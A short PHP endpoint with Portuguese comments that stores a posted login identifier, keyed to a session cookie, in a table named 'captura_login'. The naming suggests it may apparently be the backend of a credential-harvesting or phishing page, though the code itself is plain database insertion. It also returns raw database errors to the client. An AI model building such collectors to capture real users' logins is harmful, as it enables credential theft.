<?php
// api_salvar_identificador.php

// Define o cabeçalho de resposta como JSON
header('Content-Type: application/json');

// --- PASSO 1: LER O COOKIE DE SESSÃO ---
if (!isset($_COOKIE['identificador_cliente'])) {
    // Se por algum motivo o cookie não foi criado, retorna um erro.
    echo json_encode(['success' => false, 'error' => 'ID de sessão não encontrado. Limpe os cookies e tente novamente.']);
    exit;
}
$session_id = $_COOKIE['identificador_cliente'];


// Inclui o coração do projeto para ter acesso ao banco de dados ($pdo)
require 'db.php';

// Pega os dados enviados via POST (em formato JSON)
$data = json_decode(file_get_contents('php://input'), true);

// Validação simples dos dados recebidos
if (!isset($data['identificador']) || empty(trim($data['identificador']))) {
    echo json_encode(['success' => false, 'error' => 'O campo identificador é obrigatório.']);
    exit;
}

$identificador = trim($data['identificador']);

try {
    // --- PASSO 2: AJUSTAR A QUERY SQL ---
    // A query agora inclui a coluna "session_id"
    $stmt = $pdo->prepare(
        "INSERT INTO captura_login (session_id, identificador) VALUES (?, ?)"
    );
    
    // --- PASSO 3: EXECUTAR A QUERY ---
    // Passamos os dois parâmetros na ordem correta: session_id e depois o identificador
    $stmt->execute([$session_id, $identificador]);
    
    // Pega o ID da última inserção
    $lastId = $pdo->lastInsertId();

    // Retorna uma resposta de sucesso com o ID
    echo json_encode(['success' => true, 'id' => $lastId]);

} catch (PDOException $e) {
    // Em caso de erro no banco de dados, retorna uma mensagem de erro
    echo json_encode(['success' => false, 'error' => 'Erro ao salvar no banco de dados: ' . $e->getMessage()]);
}

?>